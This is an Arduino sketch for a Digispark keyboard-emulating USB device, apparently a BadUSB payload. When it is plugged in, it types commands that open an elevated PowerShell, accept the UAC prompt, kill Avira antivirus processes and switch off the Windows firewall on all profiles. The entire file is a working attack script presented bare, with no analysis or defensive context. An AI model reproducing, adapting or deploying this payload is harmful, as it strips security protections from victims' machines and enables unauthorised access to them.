#include "DigiKeyboardDe.h"
#define KEY_LEFT_ARROW 0x50

int timer = 2000;

void setup() {
  DigiKeyboardDe.update();
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.print("cmd");
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(timer);
  DigiKeyboardDe.print("powershell");
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(timer);
  DigiKeyboardDe.print("Start-Process powershell -Verb runAs");
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(timer);
  DigiKeyboardDe.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(timer);
  DigiKeyboardDe.print("Stop-Process -name Avira*");
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(timer);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(timer);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(timer);
  DigiKeyboardDe.print("cmd.exe /c 'netsh advfirewall set allprofiles state off'");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  for (int x = 0; x < 3 ;x++)
  {
    DigiKeyboardDe.delay(timer);
    DigiKeyboardDe.print("exit");
    DigiKeyboardDe.delay(timer);
    DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  }
}

void loop() {
}
